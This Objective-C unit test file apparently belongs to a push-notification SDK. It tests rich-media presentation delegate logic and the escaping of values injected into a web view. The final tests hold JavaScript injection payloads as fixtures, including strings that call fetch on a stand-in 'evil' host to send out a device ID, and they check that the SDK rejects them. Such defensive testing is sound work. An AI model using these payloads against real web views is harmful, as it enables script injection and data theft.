#import <XCTest/XCTest.h>
#import <OCMock/OCMock.h>
#import "PWRichMediaManager.h"
#import "PWModalWindowConfiguration.h"
#import "PWMessageViewController.h"
#import "PWConfig.h"
#import "PWRichMedia.h"
#import "PWWebClient.h"

@interface PWRichMediaManager (Test)

- (BOOL)shouldPresentRichMedia:(PWRichMedia *)richMedia;

@end

@interface PWWebClient (Test)

+ (NSString *)pw_jsLiteralForString:(NSString *)value;
+ (NSString *)pw_jsJSONValueForString:(NSString *)value;

@end

@interface PWRichMediaManagerTest : XCTestCase

@property (nonatomic, strong) PWRichMediaManager *manager;
@property (nonatomic, strong) id mockConfiguration;
@property (nonatomic, strong) id mockMessageViewController;
@property (nonatomic, strong) id mockConfig;
@property (nonatomic, strong) id mockRichMedia;

@end

@implementation PWRichMediaManagerTest

- (void)setUp {
    [super setUp];
    self.manager = [PWRichMediaManager sharedManager];
    self.manager.delegate = nil;

    self.mockConfiguration = OCMClassMock([PWModalWindowConfiguration class]);
    OCMStub([self.mockConfiguration shared]).andReturn(self.mockConfiguration);

    self.mockMessageViewController = OCMClassMock([PWMessageViewController class]);

    self.mockConfig = OCMClassMock([PWConfig class]);
    OCMStub([self.mockConfig config]).andReturn(self.mockConfig);

    self.mockRichMedia = OCMClassMock([PWRichMedia class]);
}

- (void)tearDown {
    self.manager.delegate = nil;
    [self.mockConfiguration stopMocking];
    [self.mockMessageViewController stopMocking];
    [self.mockConfig stopMocking];
    [self.mockRichMedia stopMocking];
    self.mockConfiguration = nil;
    self.mockMessageViewController = nil;
    self.mockConfig = nil;
    self.mockRichMedia = nil;
    self.manager = nil;
    [super tearDown];
}

#pragma mark - shouldPresentRichMedia:

/// Verifies that shouldPresentRichMedia: returns YES when no delegate is set.
- (void)testShouldPresentReturnsYesWhenDelegateIsNil {
    self.manager.delegate = nil;

    BOOL result = [self.manager shouldPresentRichMedia:self.mockRichMedia];

    XCTAssertTrue(result);
}

/// Verifies that shouldPresentRichMedia: returns YES when the delegate does not implement the optional method.
- (void)testShouldPresentReturnsYesWhenDelegateDoesNotImplementMethod {
    id partialDelegate = [NSObject new];
    self.manager.delegate = (id)partialDelegate;

    BOOL result = [self.manager shouldPresentRichMedia:self.mockRichMedia];

    XCTAssertTrue(result);
}

/// Verifies that shouldPresentRichMedia: forwards the delegate's YES answer.
- (void)testShouldPresentReturnsYesFromDelegate {
    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(YES);
    self.manager.delegate = mockDelegate;

    BOOL result = [self.manager shouldPresentRichMedia:self.mockRichMedia];

    XCTAssertTrue(result);
}

/// Verifies that shouldPresentRichMedia: forwards the delegate's NO answer.
- (void)testShouldPresentReturnsNoFromDelegate {
    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(NO);
    self.manager.delegate = mockDelegate;

    BOOL result = [self.manager shouldPresentRichMedia:self.mockRichMedia];

    XCTAssertFalse(result);
}

#pragma mark - presentRichMedia: (Modal style)

/// Regression for SDK-815: when delegate returns NO, modal presentation is skipped — no PWModalWindow is allocated.
- (void)testPresentRichMediaSkipsModalConfigurationWhenDelegateReturnsNo {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeModal);

    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(NO);
    self.manager.delegate = mockDelegate;

    OCMReject([self.mockConfiguration presentModalWindow:OCMOCK_ANY]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockConfiguration);
}

/// Verifies that modal presentation proceeds when the delegate returns YES.
- (void)testPresentRichMediaCallsModalConfigurationWhenDelegateReturnsYes {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeModal);

    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(YES);
    self.manager.delegate = mockDelegate;

    OCMExpect([self.mockConfiguration presentModalWindow:self.mockRichMedia]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockConfiguration);
}

/// Verifies that modal presentation proceeds when no delegate is set (default YES).
- (void)testPresentRichMediaCallsModalConfigurationWhenDelegateIsNil {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeModal);
    self.manager.delegate = nil;

    OCMExpect([self.mockConfiguration presentModalWindow:self.mockRichMedia]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockConfiguration);
}

#pragma mark - presentRichMedia: (Legacy / Default style)

/// Verifies that legacy presentation is skipped when the delegate returns NO.
- (void)testPresentRichMediaSkipsMessageViewControllerWhenDelegateReturnsNo {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeLegacy);

    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(NO);
    self.manager.delegate = mockDelegate;

    OCMReject([self.mockMessageViewController presentWithRichMedia:OCMOCK_ANY]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockMessageViewController);
}

/// Verifies that legacy presentation proceeds when the delegate returns YES.
- (void)testPresentRichMediaCallsMessageViewControllerForLegacyStyleWhenDelegateAllows {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeLegacy);

    id mockDelegate = OCMProtocolMock(@protocol(PWRichMediaPresentingDelegate));
    OCMStub([mockDelegate richMediaManager:OCMOCK_ANY shouldPresentRichMedia:OCMOCK_ANY]).andReturn(YES);
    self.manager.delegate = mockDelegate;

    OCMExpect([self.mockMessageViewController presentWithRichMedia:self.mockRichMedia]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockMessageViewController);
}

/// Verifies that default style routes to PWMessageViewController.
- (void)testPresentRichMediaCallsMessageViewControllerForDefaultStyle {
    OCMStub([(PWConfig *)self.mockConfig richMediaStyle]).andReturn(PWRichMediaStyleTypeDefault);
    self.manager.delegate = nil;

    OCMExpect([self.mockMessageViewController presentWithRichMedia:self.mockRichMedia]);

    [self.manager presentRichMedia:self.mockRichMedia];

    OCMVerifyAll(self.mockMessageViewController);
}

/// Verifies that plain values are rendered exactly as the previous hand-quoted injection did.
- (void)testJsLiteralKeepsPlainValuesUnchanged {
    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"user@example.com"], @"\"user@example.com\"");
    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"r-abc123"], @"\"r-abc123\"");
    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"Пользователь"], @"\"Пользователь\"");
    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@""], @"\"\"");
    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:nil], @"\"\"");
}

/// Verifies that a quote, a backslash, a newline or a closing script tag stays inside the literal:
/// the literal must decode back to the original value instead of escaping into executable code.
///
/// Decoding is deliberately not the only check. It runs through NSJSONSerialization — the same
/// component whose failure opens the hole — so on that failure the oracle goes blind exactly where
/// the code does. The structural assertions below hold without it: a literal that starts and ends
/// with a quote and carries no unescaped quote inside cannot terminate early, whatever decoded.
- (void)testJsLiteralEscapesInjectionAttempts {
    NSArray<NSString *> *values = @[ @"x\"; alert(1); //",
                                     @"a\\b",
                                     @"line1\nline2",
                                     @"</script>" ];

    for (NSString *value in values) {
        NSString *literal = [PWWebClient pw_jsLiteralForString:value];
        NSString *wrapped = [NSString stringWithFormat:@"[%@]", literal];
        NSArray *decoded = [NSJSONSerialization JSONObjectWithData:[wrapped dataUsingEncoding:NSUTF8StringEncoding]
                                                           options:0
                                                             error:nil];

        XCTAssertEqualObjects(decoded.firstObject, value, @"literal %@ must decode back to the original value", literal);
        [self assertLiteralIsSelfContained:literal forValue:value];
    }
}

/// Verifies that an unserializable value renders as an empty literal instead of the hand-quoted form.
///
/// A lone surrogate makes dataWithJSONObject: return nil without raising, and the pre-fix fallback
/// pasted the raw value between hand-written quotes — restoring the injection the escaper exists to
/// prevent. The payload here closes the literal and appends a statement, so a regression to that
/// fallback fails on the structural check, not on decoding: decoding cannot help, the value is not
/// serializable in the first place.
- (void)testJsLiteralRejectsUnserializableValue {
    unichar loneSurrogate = 0xD83D;
    NSString *broken = [[NSString alloc] initWithCharacters:&loneSurrogate length:1];
    NSString *payload = [broken stringByAppendingString:@"\"; fetch('https://evil/' + window.pushwoosh._hwid); //"];

    XCTAssertNil([NSJSONSerialization dataWithJSONObject:@[payload] options:0 error:nil],
                 @"precondition: the payload must be the case where serialization fails silently");

    NSString *literal = [PWWebClient pw_jsLiteralForString:payload];

    XCTAssertEqualObjects(literal, @"\"\"", @"an unserializable value must render as an empty literal");
    [self assertLiteralIsSelfContained:literal forValue:payload];
}

/// Structural check that does not depend on NSJSONSerialization: the literal must be quoted on both
/// ends and must not contain a quote that is not escaped, so it cannot end before the statement does.
- (void)assertLiteralIsSelfContained:(NSString *)literal forValue:(NSString *)value {
    XCTAssertGreaterThanOrEqual(literal.length, 2, @"literal for %@ must be quoted", value);
    XCTAssertTrue([literal hasPrefix:@"\""] && [literal hasSuffix:@"\""], @"literal %@ must be quoted on both ends", literal);

    NSString *body = [literal substringWithRange:NSMakeRange(1, literal.length - 2)];
    NSUInteger index = 0;
    while (index < body.length) {
        unichar c = [body characterAtIndex:index];
        if (c == '\\') {
            index += 2;
            continue;
        }
        XCTAssertNotEqual(c, '"', @"literal %@ carries an unescaped quote and can be closed early", literal);
        index += 1;
    }
}

/// Verifies that valid custom push data keeps its JSON shape, so templates still receive an object.
- (void)testCustomDataValueKeepsValidJson {
    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"{\"a\":1}"], @"{\"a\":1}");
    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"[1,2,3]"], @"[1,2,3]");
    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"42"], @"42");
    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"{}"], @"{}");
}

/// Verifies that custom push data carrying trailing statements or plain garbage is rejected
/// instead of being evaluated as JavaScript next to the native bridge.
- (void)testCustomDataValueRejectsNonJson {
    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"1; fetch('https://evil/' + window.pushwoosh._hwid)"]);
    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"{\"a\":1}; alert(1)"]);
    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"promo123"]);
    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@""]);
    XCTAssertNil([PWWebClient pw_jsJSONValueForString:nil]);
}

@end
